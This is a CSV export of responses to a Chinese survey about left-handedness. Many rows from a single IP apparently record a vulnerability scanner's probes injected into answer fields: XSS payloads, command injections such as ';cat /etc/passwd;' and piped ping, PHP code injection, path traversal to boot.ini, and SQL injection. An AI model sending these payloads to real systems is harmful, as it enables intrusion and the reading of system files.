id,topic1,topic2,topic3,topic4,topic5,topic6,topic7,topic8,topic9,topic10,topic11,topic12,topic13,topic14,topic15,topic16,topic17,topic18,topic19,topic20,topic21,topic22,topic23,topic24,topic25,topic26,topic27,topic28,topic29,topic30,qt1,qt2,qt3,qt4,qt5,qt6,qt7,qt8,qt9,qt10,qt11,qt12,qt13,qt14,qt15,qt16,qt17,qt18,qt19,qt20,qt21,qt22,qt23,qt24,qt25,qt26,qt27,qt28,qt29,qt30,comment,addip,addtime
1070,是,会,有,支持,"
 SomeCustomInjectedHeader:injected_by_test",会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1071,是,会,有,支持,左手,"会点，但不熟练'[.](,.)(""",我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1072,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇<body ONLOAD=alert(42873)>,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1073,是,会,有,支持,左手,会点，但不熟练,我是幸福的,"没感觉到<BASE HREF=""javascript:alert(42873);//"">",好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1074,是,会,;cat /etc/passwd;,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1075,是,会,有,支持,左手,会点，但不熟练,我是幸福的<body ONLOAD=alert(42873)>,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1076,是,会,有,<dir,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1077,|ping -c 4 127.0.0.1,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1078,是,会,有,支持,dir,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1079,是,会,有,支持,左手,会点，但不熟练[],我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1080,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,"好奇<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCg0Mjg3Myk8L3NjcmlwdD4=>",家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1081,是,会,有,支持,左手,会点，但不熟练,我是幸福的,"没感觉到"" onmouseover=propromptmpt(42873) bad=""",好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1082,是,会,`ping -c 5 127.0.0.1`,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1083,是,会,有,支持,左手,会点，但不熟练,"我是幸福的<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCg0Mjg3Myk8L3NjcmlwdD4=>",没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1084,是,会,有,http://oxoxoxoxoxoxox.com,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1085,response.write(9412458*9542755),会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1086,是,会,有,支持,<dir,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1087,是,会,有,支持,左手,会点，但不熟练??,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1088,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1089,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇<EMBED SRC=javascript:alert(42873)></EMBED>,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1090,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1091,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到<iframe src=http://xxooxxoo.js>,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1092,是,会,|ping -n 5 127.0.0.1|,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1093,是,会,有,支持,左手,会点，但不熟练,我是幸福的<EMBED SRC=javascript:alert(42873)></EMBED>,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1094,是,会,有,oxoxoxoxoxoxox.com,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1095,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1096,是,会,有,支持,http://oxoxoxoxoxoxox.com,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1097,是,会,有,支持,左手,"会点，但不熟练'""",我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1098,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,"好奇<BASE HREF=""javascript:alert(42873);//"">",家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1099,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到',好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1100,是,会,|ping -c 4 127.0.0.1,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1101,是,会,有,支持,左手,会点，但不熟练,"我是幸福的<BASE HREF=""javascript:alert(42873);//"">",没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1102,是,会,有,+/v9 +ADw-script+AD4-alert(1)+ADw-/script+AD4-,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1103,是,会,有,支持,oxoxoxoxoxoxox.com,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1104,是,会,有,支持,左手,会点，但不熟练/,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1105,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,"好奇"" onmouseover=propromptmpt(42873) bad=""",家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1106,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到%27,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1107,是,会,response.write(9412458*9542755),支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1108,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1109,是,会,有,支持,左手,会点，但不熟练,"我是幸福的"" onmouseover=propromptmpt(42873) bad=""",没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1110,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1111,是,会,有,;print(md5(1122));#,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1112,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1113,是,会,有,支持,+/v9 +ADw-script+AD4-alert(1)+ADw-/script+AD4-,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1114,是,会,有,支持,左手,会点，但不熟练),我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1115,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇<iframe src=http://xxooxxoo.js>,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1116,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1117,是,会,有,支持,左手,会点，但不熟练,我是幸福的<iframe src=http://xxooxxoo.js>,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1118,是,会,有,');print(md5(1122));//,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1119,是,会,有,支持,;print(md5(1122));#,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1120,是,会,有,支持,左手,会点，但不熟练!((),我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1121,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇',家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1122,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到\',好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1123,是,会,有,支持,左手,会点，但不熟练,我是幸福的',没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1124,是,会,有,${@print(md5(1122))},左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1125,是,会,有,支持,');print(md5(1122));//,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1126,是,会,有,支持,左手,会点，但不熟练alert(42873),我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1127,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇%27,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1128,是,会,有,支持,左手,会点，但不熟练,我是幸福的,"没感觉到\""",好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1129,是,会,有,支持,左手,会点，但不熟练,我是幸福的%27,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1130,是,会,有,"data:text/plain,<?php print(md5(1122));?>",左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1131,是,会,有,支持,${@print(md5(1122))},会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1132,是,会,有,支持,左手,../../../../../../../../boot.ini,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1133,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1134,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到JyI=,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1135,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1136,是,会,有,phpinfo,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1137,是,会,有,支持,"data:text/plain,<?php print(md5(1122));?>",会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1138,是,会,有,支持,左手,../../../../../../../../boot.ini,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1139,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇\',家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1140,是,会,有,支持,左手,会点，但不熟练,我是幸福的,"没感觉到'""",好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1141,是,会,有,支持,左手,会点，但不熟练,我是幸福的\',没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1142,是,会,有,<?exit(md5(1122));?>,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1143,是,会,有,支持,phpinfo,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1144,是,会,有,支持,左手,????????????????????????????????????????????????boot.ini,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1145,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,"好奇\""",家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1146,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子 AND 1=CHAR(106)+CHAR(106)+CHAR(106),立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1147,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到?',好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1148,是,会,有,支持,左手,会点，但不熟练,"我是幸福的\""",没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1149,是,会,有,'];print(md5(1122));//,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1150,是,会,有,支持,<?exit(md5(1122));?>,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1151,是,会,有,支持,左手,../../../../../../../../boot.ini,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1152,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到,好奇JyI=,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1153,是,会,有,支持,左手,会点，但不熟练,我是幸福的,没感觉到e360,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1154,是,会,有,支持,左手,会点，但不熟练,我是幸福的JyI=,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1155,是,会,有,<?php print(md5(1122));exit;?>,左手,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
1156,是,会,有,支持,'];print(md5(1122));//,会点，但不熟练,我是幸福的,没感觉到,好奇,家里有左撇子,立即纠正，因为自古都是右手写字,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,61.139.126.203,2015/5/31
